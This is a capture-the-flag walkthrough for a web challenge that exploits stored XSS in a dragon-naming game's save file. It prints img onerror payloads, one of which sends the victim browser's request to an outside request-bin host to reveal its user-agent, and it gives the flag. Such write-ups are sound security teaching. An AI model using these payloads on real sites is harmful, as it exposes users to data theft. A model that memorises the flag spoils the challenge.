# Writeup for `unnamed dragon challenge`

|  author  | category | value |
|----------|----------|-------|
| Ixbixbam |   web    |  200  |

I added a nice feature to this game that lets you use custom formatting, but when I asked the developers what they thought about it, they said it was vulnerable to XSS, and gave me a proof-of-concept save-game that proved that they could find out my browser! They also had the idea that someone could trick you into pasting in a malicious save game, which creates a popup asking you download some malware. 

Can you work out how to find what web browser I'm using if I paste the save game you give me at `/submit`? The flag is located where the web browser information would typically be.

Bonus: Do you think its worth the time for developers to fix this issue, and if so, how would you recommend solving it?


| cost |                                                                                                                                                                   content                                                                                                                                                                    |
|------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|  0   | Have you bought and named your dragon yet?                                                                                                                                                                                                                                                                                                   |
|  0   | This challenge will be much easier if you check the website's source code using the Developer Tools and viewing the files in the Sources or Debugger tabs. You may find it helpful to find relevant code by Inspecting the element with the dragon name and seeing what JavaScript function it calls, or Inspecting the text import element. |

## Solution

<details>
<summary>Click here to reveal the solution!</summary>

### The Big Idea

Exploit a self-XSS vulnerability originating from a malicious save-game.

### Walkthrough

There are many different approaches to this challenge, which makes sense since it is so broad. I wanted to give an example of a large application like this because there's lots of traces and clues to pick up if you know where to look.

One approach:
When the game first opens, you will see that you can purchase a dragon for 200 coins, which will likely be the dragon that is `unnamed`, alluded to in the challenge title and the game name. We can purchase it in less than a minute of legitimate gameplay, and we can be confident that the challenge involves it because of how it is initially called the  `unnamed dragon`. 

Experimenting with it, we can see that it has the same name when the browser is refreshed, so the name must be stored persistently. Trying to add an injection straight away reveals that it is removed, so this would be the first time I'd open the DevTools to look at the website's code. 
![Pasted image 20241104213615](https://github.com/user-attachments/assets/2e9f7776-af2b-47f2-887f-76c767420d03)

To find out more information about how the text input works, you can press the `Pick an element from the page` button in the top right of the DevTools then click the text input. You can see that `onblur` it calls `saveDragonName` (I don't know why unfocusing an element is called a  `blur` event in HTML). If you go into the Debugger (known as Sources in Chromium browsers) and search all the files for `saveDragonName` using `Ctrl-Shift-F`, you can find my modification, which references a UNSW subject. 
![Pasted image 20241104214355](https://github.com/user-attachments/assets/f6e913ae-84f8-4028-8bed-13f873a9cdc7)

The script makes sure that `game.dragonName` is sanitised, and can't contain any nefarious HML tags, so that means we're out of luck, right? 

Not quite.

Even though the client validates the string, what's stopping us from changing `game.dragonName` ourselves? The console is quite convenient, and let's us type whatever JavaScript code we want to help us debug, so we can type `game.dragonName = "<script>alert('hello')</script>"`. After we save the game, refreshing the page greets us with.......... 

nothing.

I was genuinely confused at this point too, and thought there was a bug in my program. I did some [research](https://www.google.com/search?q=adding+script+tag+in+innerhtml+doesnt+execute) and found out that you [can't add a script tag to a document](https://www.danielcrabtree.com/blog/25/gotchas-with-dynamically-adding-script-tags-to-html) using the `.innerHTML` property, which does make sense. Helpfully, the same website gives us a lead to work out how to still perform XSS.
	But beware, this doesn't mean innerHTML is safe from cross-site scripting. It is possible to execute JavaScript via innerHTML without using `<script>` tags as illustrated on [MDN's innerHTML page](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML).

Using the MDN documentation, the following should inject JavaScript into the webpage: 
`game.dragonName = "<img src='x' onerror='alert(\"We are in!\")'>"`. 

![Pasted image 20241104224306](https://github.com/user-attachments/assets/1cca497b-f2c9-471a-9b2b-15e309e51d9c)


Now we have the issue of finding out what browser was used. As we were told about in lectures, we can use a service like [HTTP request bin](https://pipedream.com/requestbin) here that can let you see the logs for all the networks requests sent there. 
So if we run something like the following, we should get the request:
`game.dragonName = "<i>Innocent</i> dragon<img src='x' onerror='fetch(\"https://something-awesome.free.beeceptor.com\")'>"`

Running this locally found what web browser I was using in the `user-agent` HTTP header!
![Pasted image 20241104231334](https://github.com/user-attachments/assets/064e58f0-749b-4891-bd46-9027e5775c5e)

I sent [this save](./writeup-payload.txt) to the `/submit` page and obtained the flag:


![Pasted image 20241105000643](https://github.com/user-attachments/assets/8e0bc138-791f-4ead-911e-effbefa28e89)


Other ideas:
- The `.git` subdirectory is exposed, so you could see my latest commit which introduced the vulnerability. Alternatively, you could download and compare the files using `diff` to the ones on the official GitHub repository.
- Most web-games use base64 encoding, so you could probably make an educated guess it would use this method as well. Additionally, it starts with `eyJ` which encodes `{`, a very common character for base64 to start with because of how it stores JSON data in string form.
- You could use the _Application_ tab of the DevTools to see the data saved by the game. Most games use the same encoding as exporting and importing games, however, this game uses stringified JSON, which doesn't require any technical expertise to modify (after initially finding it). 
- Use a breakpoint to pause the script's execution during function that exports the game or the one that sanitises the name, and explicitly updating the variable in the console with one that contains malicious JavaScript. 
- You could further investigate the save game format by seeing all the properties it contains. The code tries to sanitise every string back into a custom Decimal type except for `dragonName`, which also indicates that this is the attack path. 
- If you didn't want to start the game normally, you could try to cheat yourself extra resources either manually by modifying the game object with `game.gold.mag += 1000`, or by finding save games online: the official GitHub repository conveniently has several for you to choose from.
- Is the regex vulnerable to an attack similar to the `adadminmin` one we saw in class, where a single round of replacement may still allow the blacklisted string? 


### Flag(s)

- `SCONES{cLi3nt_s1de_$anit1sati0n}`

</details>
